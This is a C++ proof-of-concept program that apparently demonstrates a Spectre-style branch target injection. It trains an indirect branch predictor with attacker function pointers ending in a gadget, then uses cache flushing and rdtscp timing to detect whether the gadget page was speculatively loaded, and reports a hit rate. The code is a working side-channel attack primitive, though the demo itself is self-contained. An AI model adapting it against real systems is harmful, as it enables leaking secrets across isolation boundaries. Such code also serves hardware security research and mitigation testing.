

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <emmintrin.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef CACHELINE_SIZE
#define CACHELINE_SIZE 64
#endif
#ifndef ITERS
#define ITERS 10000
#endif
#ifndef TRAIN_REPS
#define TRAIN_REPS 512
#endif
#ifndef THRESHOLD
#define THRESHOLD 120
#endif
#ifndef ARRAY_SIZE
#define ARRAY_SIZE 32
#endif
#ifndef NUM_PAGES
#define NUM_PAGES 256
#endif
#ifndef GADGET_PAGE
#define GADGET_PAGE 13
#endif

#include "run_sequence.h"

FuncPtr victim_funcs[ARRAY_SIZE] = {};
FuncPtr attacker_funcs[ARRAY_SIZE] = {};
FuncPtr& victim_final_func = victim_funcs[ARRAY_SIZE - 1];
FuncPtr& attacker_final_func = attacker_funcs[ARRAY_SIZE - 1];
void *probe_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
void *train_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
static volatile unsigned char sink = 0;

static inline long time_load(void *ptr) {
    unsigned int junk = 0;
    unsigned long long start = __rdtscp(&junk);
    sink ^= *(volatile unsigned char *)ptr;
    return (long)(__rdtscp(&junk) - start);
}

#define TIME_LOAD(ptr) time_load((void *)(ptr))

static unsigned int lcg_next(unsigned int state) {
    return state * 1664525u + 1013904223u;
}

static int probe(void *buf, int num_slots, int threshold, int *order, unsigned int *lcg_state) {
    for (int i = 0; i < num_slots; ++i) {
        order[i] = i;
    }
    for (int i = num_slots - 1; i > 0; --i) {
        *lcg_state = lcg_next(*lcg_state);
        int j = (int)(*lcg_state % (unsigned int)(i + 1));
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }

    for (int i = 0; i < num_slots; ++i) {
        int page = order[i];
        char *ptr = (char *)buf + page * PAGE_SIZE;
        if (TIME_LOAD(ptr) < threshold) {
            return page;
        }
    }

    return -1;
}

static int fn0(void*) { return 0; }
static int fn1(void*) { return 1; }
static int fn2(void*) { return 2; }
static int fn3(void*) { return 3; }
static int final_legitimate(void*) { return 4; }
static int final_gadget(void* buf) {
    return *((volatile unsigned char*)buf + PAGE_SIZE * GADGET_PAGE);
}

__attribute__((noinline))
void initialize_functions() {
    FuncPtr choices[] = {fn0, fn1, fn2, fn3};

    for (int i = 0; i < ARRAY_SIZE - 1; ++i) {
        FuncPtr choice = choices[(i * 7 + 3) & 3];
        victim_funcs[i] = choice;
        attacker_funcs[i] = choice;
    }

    victim_final_func = final_legitimate;
    attacker_final_func = final_gadget;
}

void* alloc_buf(int num_pages) {
    void* buf = mmap(NULL, PAGE_SIZE*num_pages, PROT_READ | PROT_WRITE
        , MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memset(buf, 0, PAGE_SIZE*num_pages);

    return buf;
}

void flush_buffer(void* buf, int buf_sz) {
    for (int i = 0; i < buf_sz; i += CACHELINE_SIZE) {
        _mm_clflush((char*)buf + i);
    }
    _mm_lfence();
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

static void train_predictor() {
    for (int i = 0; i < TRAIN_REPS; ++i) {
        run_sequence(attacker_funcs, train_buf);
    }
}

static void victim_attempt() {
    _mm_clflush(&victim_final_func);
    _mm_mfence();
    run_sequence(victim_funcs, probe_buf);
    _mm_mfence();
}

int main() {
    const int cpu = 0;

    pin_cpu(cpu);
    initialize_functions();

    probe_buf = alloc_buf(NUM_PAGES);
    train_buf = alloc_buf(NUM_PAGES);

    int order[NUM_PAGES];
    unsigned int lcg_state = 1;
    int hits = 0;

    for (int i = 0; i < ITERS; ++i) {
        train_predictor();

        flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
        victim_attempt();

        int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
        if (found == GADGET_PAGE) {
            hits++;
        }
    }

    printf("attempts=%d hits=%d hit_rate=%.2f%%\n",
           ITERS, hits, 100.0 * (double)hits / (double)ITERS);
    return 0;
}
